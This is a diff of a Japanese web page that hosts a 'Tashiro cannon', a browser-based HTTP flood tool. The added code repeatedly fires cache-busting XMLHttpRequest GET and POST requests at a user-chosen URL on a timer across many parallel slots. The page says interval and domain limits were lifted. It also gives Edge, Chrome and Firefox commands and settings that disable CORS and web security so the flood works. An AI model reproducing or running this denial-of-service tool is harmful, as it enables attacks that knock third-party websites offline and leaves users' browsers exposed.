@@ -9,7 +9,6 @@
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
-
   gtag('config', 'G-N339EH4J47');
 </script>
 <script language="JavaScript">
@@ -72,13 +71,13 @@
 			bomb = m_stBomburl;
 			//XMLHttpRequest_GET
 			xhr2.open(method2, bomb, async);
-	    		xhr2.setRequestHeader("Pragma", "no-cache");
+	    xhr2.setRequestHeader("Pragma", "no-cache");
  			xhr2.setRequestHeader("Cache-Control", "no-store");
  			xhr2.setRequestHeader("If-Modified-Since", "Thu, 01 Jun 1970 00:00:00 GMT");
 			xhr2.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
  			xhr2.send();
 			m_ifFrame[i].setAttribute("src", bomb);
-            		//XMLHttpRequest_POST
+      //XMLHttpRequest_POST
 			xhr.open(method, bomb, async);
 			xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 			xhr.send(postdata);
@@ -88,9 +87,41 @@
 		m_toDoing = setTimeout("goBomb()", m_inInterval);
 	}
 
+	function main_XML()
+	{
+		m_inInterval = document.m_form1.m_tbInterval.value;
+		m_inWinNum = document.m_form1.m_tbWinNum.value;
+		m_stBomburl = document.m_form1.m_tbUrl.value;
+		m_inCount = 0;
+		m_toDoing_XML = setTimeout("goBomb_XML()", m_inInterval);
+	}
+
+	function goBomb_XML()
+	{
+		var bomb;
+		for(i = 0; i < m_inWinNum; i++)
+		{
+			//XMLHttpRequest
+			bomb = m_stBomburl
+			xhr2.open(method2, bomb, async);
+	    xhr2.setRequestHeader("Pragma", "no-cache");
+ 			xhr2.setRequestHeader("Cache-Control", "no-store");
+ 			xhr2.setRequestHeader("If-Modified-Since", "Thu, 01 Jun 1970 00:00:00 GMT");
+			xhr2.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+ 			xhr2.send();
+ 			//XMLHttpRequest_POST
+			xhr.open(method, bomb, async);
+			xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+			xhr.send(postdata);
+		}
+		bombCounter();
+		m_toDoing_XML = setTimeout("goBomb_XML()", m_inInterval);
+	}
+
 	function stopBomb()
 	{
 		clearTimeout(m_toDoing);
+		clearTimeout(m_toDoing_XML);
 		document.all.m_taInfo.value += "\n\n";
 		document.all.m_taInfo.value += "～訪問を中止しました～";
 	}
@@ -118,21 +149,56 @@
 本品は実験用のツールです。これを悪用して起こったいかなる損害にも、当方は責任を負いかねます。<br>
 <b>[追記 2022/12/05]</b> <br>更新間隔制限解除&ドメイン制限解除&XMLHttpRequest_GET/POST追加&キャッシュ無効化<br>
 <b>[留意点]</b><br><mark>WindowsではEdge、他はchromeが一番高効率です</mark><br>更新間隔などの数値は既定値が最良です。うまく行かない場合は変えてください。</br>
-<b>[撃つ前に]</b> <br><mark>XMLHttpRequestを使用しているため使用中のブラウザでクロスドメイン制約を回避する必要があります。Windowsの方は下記に従ってください。Android/iosでchromeを使用している場合はそのまま撃てます。</mark></br>
+<b>[撃つ前に]</b> <br><mark>XMLHttpRequestを使用しているため使用中のブラウザでクロスドメイン制約を回避する必要があります。<br>Windowsの方は下記に従ってください。Android/iosでchromeを使用している場合はそのまま撃てます。</mark></br>
 <br>
+<style>
+	.scroll2{
+  overflow: auto;
+  white-space: pre;
+  width: 700;
+  border: solid;
+  border-radius: 8px; 
+  color: white;
+  background-color: #808080;
+  text-align: center;
+  border-color: black;
+}
+</style>
 <b><mark>[Edge推奨][Edgeの場合]</mark></b>
-<br>"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --disable-web-security --user-data-dir=C:\Windows\Temp https://rifurekusyon.github.io/tornado.github.io/</br>
+<br>
+<div class="scroll2">
+	<span>
+"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --disable-web-security --user-data-dir=C:\Windows\Temp https://rifurekusyon.github.io/tornado.github.io/
+  </span>
+</div>
 <br>とコマンドプロンプトに入力。※ブラウザを閉じれば設定は元に戻ります。</br>
 <br>
-<b>[Chromeの場合]</b><br>コマンドプロンプトを開いて</br><br>"C:\Program Files\Google\Chrome\Application\chrome.exe" --disable-web-security --user-data-dir="C://Chrome dev session" https://rifurekusyon.github.io/tornado.github.io/</br>
-<br>又は</br><br>"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" --disable-web-security --user-data-dir="C://Chrome dev session" https://rifurekusyon.github.io/tornado.github.io/</br>
+<b>[Chromeの場合]</b><br>コマンドプロンプトを開いて</br>
+<br>
+<div class="scroll2">
+	<span>
+"C:\Program Files\Google\Chrome\Application\chrome.exe" --disable-web-security --user-data-dir="C://Chrome dev session" https://rifurekusyon.github.io/tornado.github.io/
+	</span>
+</div>
+<br>又は</br>
+<br>
+<div class="scroll2">
+	<span>
+"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" --disable-web-security --user-data-dir="C://Chrome dev session" https://rifurekusyon.github.io/tornado.github.io/
+</span>
+</div>
 <br>と入力。※ブラウザを閉じれば設定は元に戻ります。</br>
 <br>
 <b>[Firefoxの場合]</b>
-<br>firefoxのアドレスバーにabout:configと打ち込み、設定画面を表示する。警告画面が表示されるが、「危険を承知の上で使用する」というボタンを押下して続行。
+<br>firefoxのアドレスバーにabout:configと打ち込み、設定画面を表示する。<br>警告画面が表示されるが、「危険を承知の上で使用する」というボタンを押下して続行。
 画面から以下2つの項目を設定する。</br>
-	<br>content.cors.disable：true</br>
-	security.fileuri.strict_origin_policy：false
+	<br>
+	<div class="scroll2">
+	<span>
+content.cors.disable：<mark>true</mark>
+security.fileuri.strict_origin_policy：<mark>false</mark>
+	</span>
+</div>
 	<br>
 <br>その後再びこのサイトにアクセス。田代砲を使い終わったら設定を元に戻してください。</br>
 <br>
@@ -146,7 +212,9 @@
 【同時更新数】（窓数）<br>
 <input type="text" size="10" name="m_tbWinNum" value="20"><br>
 <br>
-<input type="button" value="開始" onclick="main();"><input type="button" value="中止" onclick="stopBomb();"> <br>
+<strong><mark>開始1は従来の田代。開始2はXMLHttpRequestを用いた田代。同時起動可能ですがデバイスの性能によってはフリーズすることがあります。<mark></strong>
+<br>
+<input type="button" value="開始1" onclick="main();"><input type="button" value="開始2(XML)" onclick="main_XML();"><input type="button" value="中止" onclick="stopBomb();"> <br>
 <br>
 【情報】<br>
 <textarea id="m_taInfo" style="border:1px solid #000000;height:100px;width:80%;">※ここに情報が表示されます。</textarea>
@@ -157,4 +225,3 @@
 </body>
 
 </html>
-
